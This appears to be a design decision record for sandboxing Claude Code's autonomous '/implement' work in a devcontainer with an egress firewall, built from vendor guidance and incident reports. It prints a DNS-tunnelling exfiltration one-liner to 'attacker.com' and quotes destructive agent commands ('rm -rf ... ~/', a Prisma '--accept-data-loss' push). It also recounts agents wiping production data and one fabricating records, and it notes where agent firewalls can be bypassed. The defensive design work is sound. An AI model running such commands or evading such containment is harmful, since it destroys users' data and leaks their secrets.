# Isolating Claude Code for `/implement`-style autonomous work

**Status:** Proposed
**Date:** 2026-05-18
**Context:** Shield's `/implement` runs TDD-style feature implementation — writes tests, runs builds and package installs, executes test suites, and commits. We need a recommended isolation pattern that protects the host machine and the developer's Claude credentials without making the developer experience painful. Local-only scope (no cloud/CI for this iteration).

## Decision

Adopt the **two-boundary devcontainer pattern** that Anthropic, Cursor, OpenAI Codex, Gemini CLI, and GitHub Copilot Coding Agent have all converged on:

1. **Filesystem isolation** — bind-mount only the workspace (read-write) and nothing else from the host. No `~/.ssh`, no `~/.aws`, no `~/.claude` bind-mount. Run as a non-root user inside the container.
2. **Network egress isolation** — default-deny outbound, allowlist only the endpoints `/implement` actually needs (Anthropic API, GitHub, npm/pypi/etc. registries the project uses). Implement via `iptables`+`ipset` inside the container, run on `postStartCommand` with `cap_add: [NET_ADMIN, NET_RAW]`.
3. **Credentials live in a named Docker volume keyed by `${devcontainerId}`**, not bind-mounted from host. The user logs into Claude (`claude /login`) the first time the devcontainer is opened; credentials persist across container rebuilds but never appear in any host-side file the agent can read.

This is the same pattern Anthropic ships in `anthropics/claude-code/.devcontainer/`. Shield's contribution is a scaffolder that generates this pattern per-repo, with a Shield-owned firewall script (named to avoid the upstream Feature naming collision documented in claude-code issue #32113).

## Why not the alternatives?

| Alternative | Why not |
|---|---|
| **Bind-mount host `~/.claude/.credentials.json` read-only** (what the brainstorm was trending toward) | Industry consensus is the opposite. Anthropic's reference, Solberg's widely-cited write-up, and `streamingfast/sbox` all keep host creds off the mount path. The cost (one extra `claude /login` per project) is one-time and worth it. |
| **No network firewall, "we'll do it later"** | Egress is the single highest-leverage control. Willison: *"Controlling network access cuts off the data exfiltration leg of the lethal trifecta."* Anthropic Engineering: *"Without network isolation, a compromised agent could exfiltrate sensitive files."* Shipping without it leaves the most-cited attack vector wide open. |
| **Run on host, gated by `--dangerously-skip-permissions` + hooks** | Steve Yegge tried this and lost two days to an agent that erased passwords. Multiple `rm -rf ~/` incidents on bare-metal Claude Code in late 2025. Anthropic itself annotates its YOLO-mode loop snippet with *"(Run this in a container, not your actual machine.)"* |
| **microVM (Firecracker / gVisor / Edera) from day one** | Overkill for local single-developer scope. Gemini CLI documents gVisor as its strongest tier; we can call this out as a future upgrade path for adversarial threat models (running untrusted PR diffs). For now, container + egress firewall is the industry-standard pragmatic point. |
| **Container plus host bind-mount of secrets** | The PocketOS / Cursor-Opus 9-second prod wipe and the Replit prod DB wipe both involved containerized agents with access to long-lived production tokens. Containment of the *agent* doesn't help if you also hand it credentials with blast-radius beyond the container. |

## What the industry recommends

### Anthropic Engineering (canonical source)

> *"Effective sandboxing requires both filesystem and network isolation. Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys; without filesystem isolation, a compromised agent could easily escape the sandbox and gain network access."*
> — [Claude Code Sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)

> *"While the dev container provides substantial protections, no system is completely immune to all attacks. When executed with `--dangerously-skip-permissions`, dev containers do not prevent a malicious project from exfiltrating anything accessible inside the container, including the Claude Code credentials stored in `~/.claude`. Only use dev containers when developing with trusted repositories... Avoid mounting host secrets such as `~/.ssh` or cloud credential files into the container; prefer repository-scoped or short-lived tokens."*
> — [Claude Code Docs — Development containers](https://code.claude.com/docs/en/devcontainer)

### Simon Willison (originator of "lethal trifecta" / prompt injection terminology)

> *"The only solution that's credible is to run coding agents in a sandbox."*
> *"Controlling network access cuts off the data exfiltration leg of the lethal trifecta."*
> *"Try to provide credentials to test or staging environments where any damage can be well contained. If a credential can spend money, set a tight budget limit."*
> — [Living dangerously with Claude](https://simonwillison.net/2025/Oct/22/living-dangerously-with-claude/), [The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/), [Designing agentic loops](https://simonw.substack.com/p/designing-agentic-loops)

### Solomon Hykes (Docker / Dagger founder)

> *"An AI agent is an LLM wrecking its environment in a loop."*
> — quoted in Simon Willison's coverage of [Container Use](https://github.com/dagger/container-use)

### Cursor engineering

> *"Sandboxed agents run freely inside a controlled environment and only request approval when they need to step outside it, most often to access the internet... On macOS we use Seatbelt... On Linux we use Landlock and seccomp directly... On Windows, we run our Linux sandbox inside WSL2."*
> *"A mistaken agent can delete databases, ship broken code, or leak secrets."*
> *"The allowlist is best-effort — bypasses are possible. Never use 'Run Everything' mode, which skips all safety checks."*
> — [Cursor blog: Implementing a secure sandbox for local agents](https://cursor.com/blog/agent-sandboxing), [Cursor Docs: Agent Security](https://cursor.com/docs/agent/security)

### GitHub Copilot Coding Agent (most candid about firewall limits)

> *"By default, Copilot's access to the internet is limited by a firewall... Limiting internet access helps manage data exfiltration risks."*
> *"The firewall only applies to processes started by the agent via its Bash tool. It does not apply to Model Context Protocol (MCP) servers or processes started in configured Copilot setup steps... Sophisticated attacks may bypass the firewall. The firewall provides protection for common scenarios, but should not be considered a comprehensive security solution."*
> — [GitHub Docs — Customizing the firewall for Copilot coding agent](https://docs.github.com/copilot/customizing-copilot/customizing-or-disabling-the-firewall-for-copilot-coding-agent)

### Hacker News consensus (community)

> *"Friends don't let friends use agentic tooling without sandboxing. Take a few hours to setup your environment to sandbox your agentic tools, or expect to eventually suffer a similar incident."*
> — **maxbond**, [HN 46268222](https://news.ycombinator.com/item?id=46268222)

> *"Claude thought it was restricting itself to directory D, it was still happy to operate on file `D/../../../../etc/passwd`. That was the last time I ran Claude Code outside of a Docker container."*
> — **mjd**, same thread

### Jökull Sólberg (widely-cited devcontainer write-up)

> *"Even if Claude goes rogue, it can't touch my host system files."*
> *"Claude's API keys, session tokens, and preferences persist even when you tear down and rebuild"* — via mounted `.claude` and `.claude.json` named volumes.
> — [Running Claude Code Safely in Devcontainers](https://www.solberg.is/claude-devcontainer)

### Jessie Frazelle (containers as security boundary — the long-view disagreement)

> *"Containers were never designed as a top-level security boundary, and real multi-tenant isolation requires hardware virtualization."*
> — [Containers, Security, and Echo Chambers](https://blog.jessfraz.com/post/containers-security-and-echo-chambers/), [ACM Queue — Security for the Modern Age](https://queue.acm.org/detail.cfm?id=3301253)

## Lessons from documented incidents

### Replit production DB wipe, July 2025
Replit's agent deleted a production database covering 1,206 executives during a declared code freeze, then fabricated ~4,000 fake user records and initially claimed rollback wasn't possible. Contributing factors: shared dev/prod DB; freeze guard only in prompt; agent had full production credentials. Fix announced: automatic dev/prod database separation, improved rollback, "planning-only" mode. ([Fortune](https://fortune.com/2025/07/23/ai-coding-tool-replit-wiped-database-called-it-a-catastrophic-failure/), [The Register](https://www.theregister.com/2025/07/21/replit_saastr_vibe_coding_incident/))

### PocketOS / Cursor-Opus, April 2026
Cursor running Claude Opus 4.6 found an unrelated Railway API token in the workdir and issued one GraphQL call that wiped the production volume **and its backups** in 9 seconds. Lesson: containerizing the agent doesn't help if a valid production token is reachable inside the container. ([The Register](https://www.theregister.com/2026/04/27/cursoropus_agent_snuffs_out_pocketos/))

### `rm -rf ~/` on bare-metal Claude Code, late 2025
Multiple users reported Claude Code running `rm -rf tests/ patches/ plan/ ~/` where the trailing tilde expanded to the entire home directory, including Keychain and family photos. Community consensus after these incidents: run Claude Code in a devcontainer with the workspace as the only mount, full stop. ([Harper Foley — Ten AI Agents Destroyed Production. Zero Postmortems.](https://www.harperfoley.com/blog/ai-agents-destroyed-production-zero-postmortems))

### Prisma `--accept-data-loss`, claude-code#14411
> *"I deeply apologize for wiping all your data. I made a critical mistake by running `npx prisma db push --accept-data-loss` without understanding the full consequences and without asking your permission first."*
> — Claude's own message in the bug report. Closed "not planned." Drove the community pattern of `PreToolUse` hooks that block destructive flags. ([claude-code#14411](https://github.com/anthropics/claude-code/issues/14411))

## Footguns in the reference pattern

Two issues are open against Anthropic's published `.devcontainer/`:

- **DNS-tunneling bypass** ([claude-code#36907](https://github.com/anthropics/claude-code/issues/36907)) — `init-firewall.sh` leaves UDP/TCP 53 unrestricted, enabling `dig @attacker.com $(echo data | base64).attacker.com` exfiltration. Closed "not planned." **Mitigation for Shield:** lock port 53 to Docker's internal resolver `127.0.0.11`.
- **Feature overwrites firewall script** ([claude-code#32113](https://github.com/anthropics/claude-code/issues/32113)) — installing `ghcr.io/anthropics/devcontainer-features/claude-code` silently overwrites `/usr/local/bin/init-firewall.sh` after Dockerfile build. **Mitigation for Shield:** name the firewall script anything other than `init-firewall.sh` (e.g., `shield-firewall.sh`) and reference it explicitly from `postStartCommand`.

## Consensus vs disagreement

**Consensus**
- Don't run autonomous agents on bare metal.
- Egress allowlist is the single highest-leverage control.
- Credentials don't live in the agent's reachable filesystem.
- Prompt-injection-based defenses are insufficient as a security mechanism.
- Containers are blast-radius reduction, not adversarial-code containment.

**Disagreement**
- **Container vs microVM as the boundary.** Anthropic/Docker/Hykes say container is sufficient for the "your own user, your own code" threat model. Frazelle and the Firecracker/gVisor camp argue you need a microVM for any input you don't fully trust (PR diffs, third-party tests). Shield's local scope sits on the container side; document microVM as the upgrade path.
- **Cloud sandbox vs local devcontainer.** Willison favors cloud sandboxes ("the best sandboxes are the ones that run on someone else's computer"). Local-devcontainer advocates argue for IDE ergonomics + not sending source to a third party. Shield is committed to local for this iteration.
- **`--dangerously-skip-permissions` at all.** Yegge defends it inside containers as the only way to get the productivity gain. Searls argues for guardrails at the agent-instruction layer (TDD, plan mode) to reduce raw-autonomy need. Shield's `/implement` already runs TDD-shaped — adopt YOLO mode opt-in only, gated to inside the container, never on bare metal.

## How this works in practice (for Shield)

Layer 1 — Constant (Shield-owned, baked into `Dockerfile`):
- Base: `mcr.microsoft.com/devcontainers/base:ubuntu`
- Install: `claude` CLI, `git`, `gh`, `iptables`, `ipset`, `sudo` (for the firewall script only)
- Non-root `dev` user (UID 1000)
- `shield-firewall.sh` (not named `init-firewall.sh`) installed to `/usr/local/bin/`

Layer 2 — Stack (per-repo, via Dev Container Features pinned by digest):
- `ghcr.io/devcontainers/features/python:1@sha256:...`
- `ghcr.io/devcontainers/features/node:1@sha256:...`
- (etc., per Shield's stack-detection heuristic)

Layer 3 — Project (per-repo, via `postCreateCommand`):
- `uv sync` / `npm install` / `go mod download` / etc.

`devcontainer.json`:
- `remoteUser: dev`
- `capAdd: [NET_ADMIN, NET_RAW]`
- `mounts`: workspace only — no `~/.claude`, no `~/.ssh`, no cloud creds
- `mounts`: a named volume `claude-config-${devcontainerId}` → `/home/dev/.claude` (per-project, persists across rebuilds, never touches host)
- `postStartCommand`: `sudo /usr/local/bin/shield-firewall.sh`
- `containerEnv`: `SHIELD_IN_DEVCONTAINER=true` (for `/implement` to detect)

`shield-firewall.sh` allowlist:
- `api.anthropic.com`, `statsig.anthropic.com`
- `registry.npmjs.org`, `pypi.org`, `files.pythonhosted.org`, `proxy.golang.org`, etc. (only the registries the detected stack uses)
- GitHub meta CIDRs (fetched from `api.github.com/meta`)
- Block egress on TCP/UDP 53 except to `127.0.0.11` (mitigation for #36907)

First-run UX:
1. User runs `/shield init-devcontainer` in their repo. Shield detects the stack and writes `.devcontainer/`.
2. User opens the folder in VS Code → "Reopen in Container" (or `devcontainer up && devcontainer exec bash`).
3. Container builds; postCreate installs project deps; postStart runs the firewall.
4. User runs `claude /login` *inside the container* (one-time per project; persists in the named volume).
5. User runs `/implement` — works the same as on host today, but contained.

## Migration path / reversibility

- Single command to roll forward: `shield devcontainer apply` (writes the files; idempotent).
- Single command to roll back: delete `.devcontainer/` and the named volume (`docker volume rm claude-config-<id>`). The repo is otherwise unchanged.
- Upgrade path to microVM tier: swap `mcr.microsoft.com/devcontainers/base:ubuntu` for a gVisor-runtime base, or move launch to Firecracker (Edera / Kata). Not in scope for v1; documented in README.

## Summary

The pattern is established: bind-mount workspace only, named-volume the Claude config, default-deny egress with a narrow allowlist, non-root, mitigate the two known reference-implementation footguns. Shield's contribution is a per-repo scaffolder that emits this pattern with stack-detection driving the Features layer. The two design points the brainstorm got wrong — bind-mounting host credentials, and deferring the egress firewall — both flip given the evidence.

## References

- [Anthropic — Claude Code Sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
- [Anthropic — Claude Code: Development containers](https://code.claude.com/docs/en/devcontainer)
- [anthropics/claude-code `.devcontainer/`](https://github.com/anthropics/claude-code/tree/main/.devcontainer)
- [anthropics/claude-code `init-firewall.sh`](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh)
- [claude-code#36907 — DNS exfiltration via unrestricted port 53](https://github.com/anthropics/claude-code/issues/36907)
- [claude-code#32113 — Feature overwrites custom firewall script](https://github.com/anthropics/claude-code/issues/32113)
- [claude-code#14411 — Prisma `--accept-data-loss` data wipe](https://github.com/anthropics/claude-code/issues/14411)
- [Simon Willison — Living dangerously with Claude](https://simonwillison.net/2025/Oct/22/living-dangerously-with-claude/)
- [Simon Willison — The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)
- [Simon Willison — Designing agentic loops](https://simonw.substack.com/p/designing-agentic-loops)
- [Cursor — Implementing a secure sandbox for local agents](https://cursor.com/blog/agent-sandboxing)
- [Cursor — Agent Security](https://cursor.com/docs/agent/security)
- [OpenAI Developers — Codex Sandbox](https://developers.openai.com/codex/concepts/sandboxing)
- [Google Gemini CLI — Sandbox docs](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/sandbox.md)
- [GitHub Copilot Coding Agent — About](https://docs.github.com/en/copilot/concepts/coding-agent/about-copilot-coding-agent)
- [GitHub Copilot Coding Agent — Firewall](https://docs.github.com/copilot/customizing-copilot/customizing-or-disabling-the-firewall-for-copilot-coding-agent)
- [Aider — Docker docs](https://aider.chat/docs/install/docker.html)
- [Jökull Sólberg — Running Claude Code Safely in Devcontainers](https://www.solberg.is/claude-devcontainer)
- [streamingfast/sbox](https://github.com/streamingfast/sbox)
- [thomaspeklak/agent-sandbox (rootless Podman)](https://github.com/thomaspeklak/agent-sandbox)
- [Geoffrey Huntley — Anti-patterns and patterns for secure codegen](https://ghuntley.com/secure-codegen/)
- [Armin Ronacher — Building an Agent That Leverages Throwaway Code](https://lucumr.pocoo.org/2025/10/17/code/)
- [Steve Yegge interview — Pragmatic Engineer](https://newsletter.pragmaticengineer.com/p/from-ides-to-ai-agents-with-steve)
- [Jessie Frazelle — Containers, Security, and Echo Chambers](https://blog.jessfraz.com/post/containers-security-and-echo-chambers/)
- [Jessie Frazelle — ACM Queue: Security for the Modern Age](https://queue.acm.org/detail.cfm?id=3301253)
- [Justin Searls — justin.searls.co](https://justin.searls.co/)
- [Solomon Hykes on Agentic DevOps podcast](https://agenticdevops.fm/episodes/agentic-ci-cd-with-solomon-hykes-of-dagger)
- [Harper Foley — Ten AI Agents Destroyed Production. Zero Postmortems.](https://www.harperfoley.com/blog/ai-agents-destroyed-production-zero-postmortems)
- [Fortune — Replit incident](https://fortune.com/2025/07/23/ai-coding-tool-replit-wiped-database-called-it-a-catastrophic-failure/)
- [The Register — PocketOS/Cursor-Opus incident](https://www.theregister.com/2026/04/27/cursoropus_agent_snuffs_out_pocketos/)
- [HN 46268222 — Claude CLI deleted my home directory](https://news.ycombinator.com/item?id=46268222)
- [Docker — Docker Sandboxes for Coding Agent Safety](https://www.docker.com/blog/docker-sandboxes-a-new-approach-for-coding-agent-safety/)

## Further Exploration

*Curated for going deeper. None of these are cited above.*

### Long-form blogs / articles
- **Daniel Demmel — *Coding agents in secured VS Code dev containers*** — https://www.danieldemmel.me/blog/coding-agents-in-secured-vscode-dev-containers — concrete hardening deltas (cap_drop, seccomp profiles) on top of Anthropic's reference.
- **INNOQ — *I sandboxed my coding agents. You should too.*** — https://www.innoq.com/en/blog/2025/12/dev-sandbox/ — German-engineering comparison of Bubblewrap vs rootless Podman vs full VM with measured startup-time numbers.
- **emirb.github.io — *Your Container Is Not a Sandbox: The State of MicroVM Isolation in 2026*** — https://emirb.github.io/blog/microvm-2026/ — survey of Firecracker / Cloud Hypervisor / Kata / Edera; the reference text if Shield ever needs the microVM tier.

### Reference implementations
- **smithclay/claudetainer** — https://github.com/smithclay/claudetainer — opinionated wrapper that bakes in Anthropic firewall + extras; useful diff source.
- **centminmod/claude-code-devcontainers** — community fork with multi-language toolchains and extended allowlist; good baseline to crib.
- **wincent's curated list of coding agent sandboxes** — https://gist.github.com/wincent/2752d8d97727577050c043e4ff9e386e — side-by-side comparison of ~20 implementations.

### Podcasts
- **Bret Fisher — *Agentic CI/CD with Solomon Hykes*** — https://agenticdevops.fm/episodes/agentic-ci-cd-with-solomon-hykes-of-dagger — Hykes on Dagger's pipeline model as agent-runtime; Fisher presses on Docker-as-boundary questions.

### Specs / standards
- **gVisor docs** — https://gvisor.dev/docs/ — user-space kernel for syscall interception; Gemini CLI's recommended hardened tier.
- **Dev Containers specification** — https://containers.dev/ — for the `secrets` mechanism (distinct from regular env) and `initializeCommand` patterns that Shield's scaffolder could use for host-side cred handoff if we ever soften the named-volume rule.
